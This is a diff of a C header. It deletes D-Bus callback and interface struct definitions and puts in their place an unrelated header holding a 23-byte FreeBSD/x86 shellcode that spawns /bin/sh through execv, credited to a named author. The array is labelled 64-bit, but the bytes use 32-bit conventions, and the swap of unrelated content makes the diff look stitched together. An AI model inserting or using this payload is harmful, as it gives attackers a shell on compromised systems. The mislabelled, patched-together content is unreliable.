@@ -22,31 +22,19 @@
  *
  */
 
-#ifndef _CALLBACKS_H_
-#define _CALLBACKS_H_
+#ifndef _EXAMPLES64FREEBSD_H_
+#define _EXAMPLES64FREEBSD_H_
 
-#ifdef HAVE_CONFIG_H
-#include <config.h>
-#endif
+/*
+ -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes -------------------------
+ *  AUTHOR : Tosh
+ *   OS    : BSDx86 (Tested on FreeBSD 8.1)
+ *   EMAIL : tosh@tuxfamily.org
+ */
 
-#include <dbus/dbus.h>
-
-struct ST_Callback {
-        char *name;
-        char *in;
-        char *out;
-        void (*func)(DBusConnection *c,DBusMessage *msg, void *data);
-};
-
-typedef struct ST_Callback ST_Callback;
-
-struct ST_Interface {
-        char *name;
-        ST_Callback *methods;
-        ST_Callback *signals;
-        ST_Callback *properties;
-};
-
-typedef struct ST_Interface ST_Interface;
+char shellcode_64bits_freebsd[] = 
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+"\x54\x53\xb0\x3b\x50\xcd\x80";
 
 #endif
